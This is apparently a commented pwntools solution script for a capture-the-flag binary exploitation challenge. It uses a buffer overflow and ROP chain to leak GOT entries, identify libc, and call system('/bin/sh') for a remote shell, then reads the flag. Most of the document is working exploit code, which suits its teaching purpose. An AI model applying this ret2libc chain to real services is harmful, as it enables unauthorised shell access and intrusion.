from pwn import *

# The name of this challenge gives us a big hint. It's talking about a ROP.
# Unfortunately for the price of this hint we don't know which libc is being
# used, so returning on a specific function of the libc is going to be hard.

conn = remote(MACHINE_IP, MACHINE_PORT)

elf = ELF("system_drop")
elf_rop = ROP(elf)

# By analysing the binary we find a main function which does a buffer overflow
# And then returns 1.
# This is really useful because it means when we'll start the rop, 1 will be
# loaded inside the `rax` register.
# And this is great because we can find a function named `_syscall` that
# finishes with a `syscall` instruction then a `ret`.
# Because the `rax` register will be set to `1`, we can do a write syscall.
# This will allow us to leak got entries.

def leak_got(entry):
    with log.progress("leaking got entry for %s" % entry) as progress:
        progress.status("forging rop")
        # Here we feed the overflow with garbage bytes until the return address.
        rop = b"A" * 0x28

        # Here we found a `pop rsi` instruction, followed by another `pop` and
        # finished with `ret`.
        # `rsi` is the second argument, so it's the address from where we want
        # to leak data.
        rop += p64(elf_rop.find_gadget(["pop rsi"]).address)
        rop += p64(elf.got[entry])
        rop += p64(0)

        # Setting the length of the write is not necessary because we keep the
        # length set for the read function.

        # Then we return to the `syscall` instruction
        rop += p64(0x0040053b)

        # And finally we restart to the main function
        rop += p64(elf.symbols["main"])

        progress.status("sending rop")
        conn.send(rop)

        progress.status("computing leak address")
        return u64(conn.recv(0x100)[:0x8])

# Now that we can leak entries from the got table, we will leak two functions
# this way we can determine which libc is being used.

leak_main = leak_got("__libc_start_main")
leak_read = leak_got("read")

log.info("Leak __libc_start_main %x" % leak_main)
log.info("Leak read %x" % leak_read)

# Once we've the address of `__libc_start_main` and `read` we can use a website
# like https://libc.blukat.me to find the libc currenly used.
# This gives us the following libc.
# All we know need is to set its base address using symbols we leaked.

libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
libc.address = leak_read - libc.symbols["read"]

# Finally we'll retrieve a shell, for this a simple rop to load the "/bin/sh"
# string inside the `rdi` register and then return to the system function.

rop = b"A" * 0x28
rop += p64(elf_rop.find_gadget(['ret']).address)
rop += p64(elf_rop.find_gadget(["pop rdi", "ret"]).address)
rop += p64(next(libc.search(b"/bin/sh")))
rop += p64(libc.sym["system"])
rop += p64(libc.sym["exit"])
conn.send(rop)

# Now we have a shell! All we need is to cat the flag!

conn.sendline("cat flag.txt")
log.success(conn.recvlineS())
